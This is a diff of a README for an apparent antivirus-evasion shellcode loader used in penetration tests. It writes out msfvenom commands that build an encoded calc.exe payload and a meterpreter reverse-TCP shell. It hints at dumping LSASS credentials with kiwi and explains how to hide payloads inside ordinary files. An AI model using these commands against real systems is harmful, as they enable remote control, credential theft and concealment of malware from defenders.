@@ -9,7 +9,7 @@ Executable compiled with this code is useful during penetration tests where ther
    calc: ```
 msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xff" -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf```
    
-   or meterpreter: ```
+   meterpreter: ```
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=... -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >foolav.mf```
 2. copy payload file `[executable-name-without-exe-extension].mf` in the same directory as executable
    payload running calc.exe generated using above command:
@@ -24,7 +24,12 @@ msfvenom -p windows/meterpreter_reverse_tcp LHOST=... -a x86 -f c 2>/dev/null | 
 ## Hints
 
 - x86 binary will run on both x86 and x86_64 Windows systems. Still, you need to use x86 architecture payloads. Nevertheless, x86 meterpreter payload can be migrated to x86_64 processes. After that, `load kiwi` will load x86_64 version making it possible to access juicy contents of LSASS process memory :)
-- parser of .mf payload file will ignore every character other than `\xHH` hexdecimal sequences. This means, it can append your payload t almost any file, hide it between the lines or even add your own comments
+
+  ![meter](https://cloud.githubusercontent.com/assets/4956006/12372509/aa21a00e-bc5a-11e5-8589-98ee8ce8bfc0.png)
+
+- parser of .mf payload file will ignore every character other than `\xHH` hexdecimal sequences. This means, it can append your payload t almost any file, hide it between the lines or even add your own comments, example:
+
+![obfuscation](https://cloud.githubusercontent.com/assets/4956006/12372526/ca361694-bc5b-11e5-9a31-be6847cdcec2.png)
 
 ## Download
 
